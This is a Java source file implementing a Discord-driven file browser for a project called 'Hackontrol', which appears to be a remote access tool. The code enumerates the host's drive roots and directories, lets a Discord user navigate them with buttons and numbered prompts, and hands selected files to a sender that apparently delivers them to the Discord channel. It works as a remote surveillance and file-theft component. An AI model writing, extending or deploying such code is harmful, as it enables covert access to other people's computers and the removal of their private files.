package com.khopan.hackontrol.channel.file;

import java.io.BufferedReader;
import java.io.File;
import java.io.StringReader;
import java.util.ArrayList;
import java.util.List;
import java.util.Stack;

import com.khopan.hackontrol.Hackontrol;
import com.khopan.hackontrol.manager.interaction.ButtonContext;
import com.khopan.hackontrol.manager.interaction.ButtonManager;
import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.manager.interaction.InteractionManager;
import com.khopan.hackontrol.manager.interaction.ModalContext;
import com.khopan.hackontrol.utils.HackontrolError;
import com.khopan.hackontrol.utils.interaction.HackontrolButton;
import com.khopan.hackontrol.utils.sendable.ISendable;
import com.khopan.hackontrol.utils.sendable.sender.ReplyCallbackSendable;

import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;
import net.dv8tion.jda.api.interactions.Interaction;
import net.dv8tion.jda.api.interactions.callbacks.IReplyCallback;
import net.dv8tion.jda.api.interactions.components.ItemComponent;
import net.dv8tion.jda.api.interactions.components.text.TextInput;
import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
import net.dv8tion.jda.api.interactions.modals.Modal;
import net.dv8tion.jda.api.interactions.modals.ModalMapping;
import net.dv8tion.jda.api.requests.restaction.MessageCreateAction;
import net.dv8tion.jda.api.requests.restaction.interactions.ReplyCallbackAction;
import net.dv8tion.jda.api.utils.messages.MessageCreateRequest;

public class FileBrowser<T extends IReplyCallback & Interaction> {
	static final String MODAL_VIEW    = "view";
	static final String MODAL_GO_INTO = "goInto";

	File file;

	private final List<File> fileList;
	private final List<File> folderList;
	private final Stack<File> stack;

	private ButtonContext context;

	private FileBrowser(T callback) {
		this.fileList = new ArrayList<>();
		this.folderList = new ArrayList<>();
		this.stack = new Stack<>();
		this.file = null;
		this.send(callback);
	}

	void modalView(ModalContext context) {
		int fileSize = this.fileList.size();
		int index = this.checkModalCallback(context, 1, fileSize + this.folderList.size());

		if(index < 1) {
			return;
		}

		File file;

		if(index > fileSize) {
			file = this.folderList.get(index - fileSize - 1);
		} else {
			file = this.fileList.get(index - 1);
		}

		FileEmbedSender.reply(file, context);
	}

	void modalGoInto(ModalContext context) {
		int fileSize = this.fileList.size();
		int folderSize = this.folderList.size();
		int index = this.checkModalCallback(context, fileSize + 1, fileSize + folderSize);

		if(index < 1) {
			return;
		}

		File file = this.folderList.get(index - fileSize - 1);
		this.stack.push(this.file);
		this.file = file;
		this.send(context);

		if(this.context != null) {
			HackontrolButton.deleteMessages(this.context);
		}
	}

	private int checkModalCallback(ModalContext context, int start, int end) {
		ModalMapping mapping = context.getValue("fileIndex");

		if(mapping == null) {
			HackontrolError.message(context.reply(), "File index cannot be null");
			return -1;
		}

		String text = mapping.getAsString();
		int index;

		try {
			index = Integer.parseInt(text);
		} catch(Throwable Errors) {
			HackontrolError.message(context.reply(), "Invalid number format");
			return -1;
		}

		if(index < start || index > end) {
			HackontrolError.message(context.reply(), "Index " + index + " out of bounds, expected " + start + " - " + end);
			return -1;
		}

		return index;
	}

	private void buttonView(ButtonContext context) {
		int fileSize = this.fileList.size();
		int folderSize = this.folderList.size();

		if(fileSize + folderSize != 1) {
			this.modal(context, FileBrowser.MODAL_VIEW, "View", 1, fileSize + folderSize);
			return;
		}

		File file;

		if(fileSize == 1) {
			file = this.fileList.get(0);
		} else {
			file = this.folderList.get(0);
		}

		FileEmbedSender.reply(file, context);
	}

	private void buttonGoInto(ButtonContext context) {
		this.context = context;
		int fileSize = this.fileList.size();
		int folderSize = this.folderList.size();

		if(folderSize != 1) {
			this.modal(context, FileBrowser.MODAL_GO_INTO, "Go Into", fileSize + 1, fileSize + folderSize);
			return;
		}

		this.stack.push(this.file);
		this.file = this.folderList.get(0);
		this.send(context);

		if(context != null) {
			HackontrolButton.deleteMessages(context);
		}
	}

	private void buttonReturn(ButtonContext context) {
		if(this.stack.isEmpty()) {
			HackontrolError.message(context.reply(), "File navigation stack is empty");
			return;
		}

		this.file = this.stack.pop();
		this.send(context);
		HackontrolButton.deleteMessages(context);
	}

	private void buttonRefresh(ButtonContext context) {
		this.send(context);
		HackontrolButton.deleteMessages(context);
	}

	private void modal(ButtonContext context, String identifier, String name, int start, int end) {
		TextInput textInput = TextInput.create("fileIndex", "File Index", TextInputStyle.SHORT)
				.setRequired(true)
				.setMinLength(Integer.toString(start).length())
				.setMaxLength(Integer.toString(end).length())
				.setPlaceholder(start + " - " + end)
				.build();

		Modal modal = Modal.create(identifier, name)
				.addActionRow(textInput)
				.build();

		context.replyModal(modal).queue();
	}

	private void actionRow(MessageCreateRequest<?> request, boolean isRoot, long... identifiers) {
		List<ItemComponent> list = new ArrayList<>();
		list.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "View", this :: buttonView));

		if(this.file == null || !this.folderList.isEmpty()) {
			list.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Go Into", this :: buttonGoInto, identifiers));
		}

		if(!isRoot) {
			list.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Return", this :: buttonReturn, identifiers));
		}

		list.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Refresh", this :: buttonRefresh, identifiers));
		list.add(HackontrolButton.delete(identifiers));
		request.addActionRow(list);
	}

	@SuppressWarnings("hiding")
	private <T extends IReplyCallback & Interaction> void send(T callback) {
		String fileText = this.buildFileText(this.file, ReplyCallbackSendable.of(callback));

		if(fileText == null) {
			return;
		}

		List<String> messageList = this.splitMessage(fileText, ReplyCallbackSendable.of(callback));

		if(messageList == null) {
			return;
		}

		String firstMessage = messageList.get(0);
		messageList.remove(0);
		ReplyCallbackAction replyCallbackAction = callback.reply(firstMessage);
		boolean isRoot = this.file == null;

		if(messageList.isEmpty()) {
			this.actionRow(replyCallbackAction, isRoot);
			replyCallbackAction.queue(InteractionManager :: callback);
			return;
		}

		MessageChannel channel = (MessageChannel) callback.getChannel();
		replyCallbackAction.queue(hook -> {
			InteractionManager.callback(hook);
			hook.retrieveOriginal().queue(message -> new Thread(() -> {
				int size = messageList.size();
				MessageCreateAction messageCreateAction;

				if(size == 1) {
					messageCreateAction = channel.sendMessage(messageList.get(0));
					this.actionRow(messageCreateAction, isRoot, message.getIdLong());
				} else {
					long[] identifierList = new long[size];
					identifierList[0] = message.getIdLong();

					for(int i = 1; i < identifierList.length; i++) {
						identifierList[i] = channel.sendMessage(messageList.get(i - 1)).complete().getIdLong();
					}

					messageCreateAction = channel.sendMessage(messageList.get(size - 1));
					this.actionRow(messageCreateAction, isRoot, identifierList);
				}

				messageCreateAction.queue(InteractionManager :: callback);
			}).start());
		});
	}

	private List<String> splitMessage(String message, ISendable reply) {
		BufferedReader reader = new BufferedReader(new StringReader(message));
		StringBuilder builder = new StringBuilder();
		List<String> messageList = new ArrayList<>();
		String line;

		try {
			while((line = reader.readLine()) != null) {
				line += '\n';

				if(builder.length() + line.length() > 2000) {
					messageList.add(builder.toString());
					builder = new StringBuilder();
				}

				builder.append(line);
			}

			if(!builder.isEmpty()) {
				messageList.add(builder.toString());
			}
		} catch(Throwable Errors) {
			HackontrolError.throwable(reply, Errors);
			return null;
		}

		return messageList;
	}

	private String buildFileText(File root, ISendable reply) {
		StringBuilder builder = new StringBuilder();
		boolean isRoot = root == null;
		File[] files = isRoot ? File.listRoots() : root.listFiles();

		if(files == null || files.length == 0) {
			HackontrolError.message(reply, "Empty file list");
			return null;
		}

		this.fileList.clear();
		this.folderList.clear();

		for(int i = 0; i < files.length; i++) {
			File file = files[i];

			if(!file.exists()) {
				continue;
			}

			if(file.isFile()) {
				this.fileList.add(file);
			}

			if(file.isDirectory()) {
				this.folderList.add(file);
			}
		}

		if(this.fileList.isEmpty() && this.folderList.isEmpty()) {
			HackontrolError.message(reply, "No files available");
			return null;
		}

		builder.append("**");
		String name = isRoot ? "SYSTEMROOT" : root.getAbsolutePath();
		Hackontrol.LOGGER.info("File Browser: '{}'", name);
		builder.append(name.replace("\\", "\\\\"));
		builder.append("**");
		int ordinal = 1;
		ordinal = this.addList(builder, this.fileList, "File", ordinal, isRoot);
		ordinal = this.addList(builder, this.folderList, "Folder", ordinal, isRoot);
		return builder.toString();
	}

	private int addList(StringBuilder builder, List<File> list, String name, int ordinal, boolean isRoot) {
		if(list.isEmpty()) {
			return ordinal;
		}

		builder.append("\n**");
		builder.append(name);
		builder.append("**");

		for(int i = 0; i < list.size(); i++) {
			File file = list.get(i);
			builder.append('\n');
			builder.append(ordinal++);
			builder.append(") `");
			builder.append(isRoot ? file.getAbsolutePath() : file.getName());
			builder.append('`');
		}

		return ordinal;
	}

	public static <T extends IReplyCallback & Interaction> FileBrowser<T> start(T callback) {
		return new FileBrowser<>(callback);
	}
}
